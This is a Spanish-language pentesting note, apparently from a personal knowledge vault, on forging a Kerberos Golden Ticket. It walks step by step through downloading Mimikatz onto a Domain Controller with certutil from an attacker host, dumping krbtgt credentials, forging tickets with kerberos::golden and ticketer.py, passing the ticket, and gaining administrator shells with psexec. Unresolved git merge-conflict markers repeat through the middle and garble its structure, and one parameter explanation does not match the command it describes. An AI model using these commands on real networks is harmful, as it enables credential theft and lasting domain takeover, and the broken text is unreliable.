Para crear un Golden Ticket son necesarios algunos datos del usuario krbtgt, estos los vamos a extraer usando [[Mimikatz]] dentro del DC (Domain Controller), para meter el Mimikatz dentro del DC recomiendo usar [[certutil]]:

Primero tenemos que hacer un servidor para hostear nuestro archivo Mmikatz, el cual podemos encontrar en [este](https://github.com/ParrotSec/mimikatz.git) repositorio de Github:

```python
sudo python3 -m http.server 1234
```

Ahora desde el DC vamos a descargarnos la herramienta (Para acceder al DC de forma remota mirar [[psexec]]):

``` Python
certutil -urlcache -split -f http://evilserve:1234/Mimikatz.exe Mimikatz.exe
```

Ya con el Mimikatz lo vamos a ejecutar:

```Python
Mimikatz
```

Para extraer las credenciales de krbtgt en la memoria de LSA (Local System Authority) usaremos el siguiente comando de [[Mimikatz]]: 

```python
lsadump::lsa /inject /name:krbtgt
```

A continuación voy a desglosar el porque usamos cada uno de los parametros:

- **/user:** El usuario cuyas credenciales serán robadas 

- **/inject:** Injecta un Payload en memoria que permite mostrarnos información mas privilegiada

Esto nos dará algo similar a esto:

![[Pasted image 20250428160113.png]]

Aqui ya estarán todos los datos que necesitamos para construir el golden ticket.

Ahora tenemos dos opciones:

- 1. Usar esto para contruir un golden.kirbi el cual nos servirá para acceder a cualquier recurso del sistema desde una maquina windows a otra, Ejemplo: PC-Juan queriendo acceder a admin$ del dc (\\\\DC-Company\\admin$) cosa que no se puede hacer normalmente.

- 2. Usar esto junto a ticketer para que el golden ticket tenga un formato ccache el cual nos permitiría acceder a cualquier maquina del dominio (la mejor opción)
<<<<<<< Updated upstream
<<<<<<< Updated upstream
<<<<<<< Updated upstream
<<<<<<< Updated upstream
<<<<<<< Updated upstream
## Tener privilegios sobre un equipo desde una maquina Windows (Primera opción)

Para esto vamos a crear un archivo golden.kirbi, luego, este lo vamos a injectar en la memoria, permitiendo que cuando esta maquina solicite un recurso privilegiado se envie el Golden ticket, permitiendo así el acceso:

```Python
kerberos::golden /domain:\[Dominio] /sid:\[SID del usuario krbtgt] /rc4:\[Hash NT] /user:Administrador /ticket:golden.kirbi
```

Ahora tenemos que mover este golden.kirbi a la maquina desde la cual queramos tener privilegios elevados, o lo que conoceremos como PTT (Pass-The-Ticket)

```python
kerberos::ptt golden.kirbi
```

Esto simplemente inyectará el ticket seleccionado en la memoria, haciendo que sea utilizado para establecer conexiones kerberos, al hacer un golden ticket, podemos acceder a cualquier recurso, ya que es como si fuéramos el administrador
## Acceder a cualquier maquina desde nuestra maquina atacante (Segunda opción)

Para esto vamos a crear un archivo Administrador.ccache el cual se va a enviar para autenticarse a las maquinas como el usuario Administrador:

Usaremos la herramienta tiketer: 

```Python
ticketer.py -ntmlhash {HASH_NT_del_usuario_krbtgt} -domain-sid {SID_del_dominio} -domain {NOMBRE_DEL_DOMINIO} {USUARIO_QUE_QUEREMOS_IMPERSONALIZAR}
```

Ahora, vamos a hacer una variable de entorno llamada KRB5CCNAME, la cual va a contener la ruta hacia el archivo Administrador.ccache, ahora vamos a usar psexec para conectarnos a cualquier maquina usando este ticket: 

```Python
psexec.py -n -k juancorp.local/Administrador@{IP_EQUIPO} powershell.exe 
```

Ahora aunque el administrador cambie su contraseña igual podremos seguir estableciendo conexión, ya que esto no depende de esa contraseña del admin, sino de la contraseña de krbtgt 
=======

>>>>>>> Stashed changes
=======

>>>>>>> Stashed changes
=======

>>>>>>> Stashed changes
=======

>>>>>>> Stashed changes
=======

>>>>>>> Stashed changes
##### Recursos 
- [Hack Tricks](https://book.hacktricks.wiki/en/windows-hardening/stealing-credentials/credentials-mimikatz.html?highlight=Mimikatz#mimikatz)


